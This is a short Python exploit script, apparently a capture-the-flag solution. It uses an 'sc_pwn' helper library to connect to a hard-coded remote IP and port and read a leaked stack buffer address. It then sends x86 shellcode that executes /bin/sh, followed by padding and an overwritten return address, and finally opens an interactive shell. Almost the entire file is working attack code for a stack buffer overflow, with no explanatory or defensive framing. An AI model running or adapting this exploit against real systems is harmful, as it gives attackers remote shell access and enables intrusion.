#!/usr/bin/env python
from sc_pwn import *

#rhp     = ("192.168.75.129",8080)
rhp     = ("54.173.98.115",1259)

str_sh  = '/bin/sh\0'

#==========
def attack(nc):
    nc.read_until('Buff: ')
    addr_buf    = int(nc.read_until('\n'),16)
    addr_str_sh = addr_buf + 0x20

    info('addr_buf  = 0x%08x' % addr_buf)

    sc = ShellCode('x86',max_len=0x80)
    asm  =  '\x31\xd2'                  # xor    edx, edx
    asm +=  '\x52'                      # push   edx
    asm +=  '\x68//sh'                  # push   0x68732f2f
    asm +=  '\x68/bin'                  # push   0x6e69622f
    asm +=  '\x89\xe3'                  # mov    ebx, esp
    asm +=  '\x31\xc9'                  # xor    ecx, ecx
    asm +=  '\x31\xc0'                  # xor    eax, eax
    asm +=  '\xb0\x4b'                  # mov    al, 0x4b
    asm +=  '\x2c\x40'                  # sub    al, 0x40
    asm +=  '\xcd\x80'                  # int    0x80
    shellcode  = sc.gen(asm)
    shellcode += sc.padding(None,'\x90')

    exploit  = shellcode
    exploit += pack_32(0x475a31a5)
    exploit += pack_32(0x40501555)
    exploit += pack_32(0x44444444)
    exploit += pack_32(0x44444444)
    exploit += pack_32(0xdeadbeef)
    exploit += pack_32(addr_buf)
    nc.sendln(exploit)
    
    nc.read_all()

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
